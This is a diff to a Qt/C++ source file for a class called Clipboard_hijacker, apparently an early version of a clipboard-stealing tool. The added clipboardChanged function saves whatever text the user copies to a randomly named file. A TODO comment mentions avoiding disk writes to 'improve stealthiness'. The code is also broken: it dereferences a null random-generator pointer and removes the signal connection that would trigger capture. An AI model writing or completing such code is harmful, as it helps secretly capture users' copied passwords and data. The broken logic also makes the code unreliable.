@@ -10,8 +10,8 @@
 Clipboard_hijacker::Clipboard_hijacker()
 {
         const QClipboard *clipboard = QApplication::clipboard();
-        connect(QApplication::clipboard(),SIGNAL(dataChanged()),this,SLOT(clipboardChanged));
         QString clipboardText = clipboard->text();
+        //testing if it works
         if(clipboardText.isEmpty())
         {
            qDebug() << "Clipboard is empty!";
@@ -22,43 +22,54 @@ Clipboard_hijacker::Clipboard_hijacker()
         }
 
 }
-
-void hijack(QClipboard *clipboard)
+/*
+void Clipboard_hijacker::hijack(QClipboard *clipboard)
 {
     const QMimeData *mimeData = clipboard->mimeData();
     QLabel labelforimages;
 
-    if (mimeData->hasImage()) {
-        clipboard->setPixmap(qvariant_cast<QPixmap>(mimeData->imageData()));
-        clipboard->image(QClipboard::Mode::Clipboard);
-    } else if (mimeData->hasHtml()) {
-        clipboard->setText(mimeData->html());
-        clipboard->text(QClipboard::Mode::Clipboard);
-    } else if (mimeData->hasText()) {
-        clipboard->setText(mimeData->text());
-    }
-}
 
-bool clipboardhasChanged()
+}
+*/
+void Clipboard_hijacker::clipboardChanged()
 {
+    QClipboard *clipchanged = QApplication::clipboard();
     QRandomGenerator *randomNumber=nullptr;
     QString filename = QString::number(randomNumber->generate());
     QFile file(filename);
+    qDebug() << "entered";
     while(QFileInfo::exists(filename))
     {
         filename=QString::number(randomNumber->generate());
         qDebug() << "file exists"<< endl;
     }
-    //Ici on a forcement un nom de fichier unique
+    //From there, filename has to be unique, avoid colisions (here it's useless but implemented for maybe later use since we could rewrite data in the file)
     file.open(QIODevice::ReadWrite);
     QTextStream out(&file);
-    out << Clipboard_hijacker::
+    out << clipchanged->text();
+    return;
+    //TODO use md5 to produce unique filename to avoid conflicts in filename, besides could avoid writing to filesystem to improve stealthiness)s
     //QByteArray hash = QCryptographicHash::hash(QClipboard::text(QClipboard::Clipboard).toLocal8bit(), QCryptographicHash::Md5);
-      //if(clipboard->)
+     
 }
 
-QString getclipboardData()
+QString Clipboard_hijacker::getclipboardString()
     {
-           QClipboard *clip = QApplication::clipboard();
-           return clip->text();
+        QClipboard *clip = QApplication::clipboard();
+        return clip->text();
     }
+
+QImage Clipboard_hijacker::getclipboardImage()
+{
+    QClipboard *clip = QApplication::clipboard();
+    return clip->image();
+}
+const QMimeData* Clipboard_hijacker::getMimeData()
+{
+    QClipboard *clip = QApplication::clipboard();
+    return clip->mimeData();
+}
+Clipboard_hijacker::~Clipboard_hijacker()
+{
+
+}
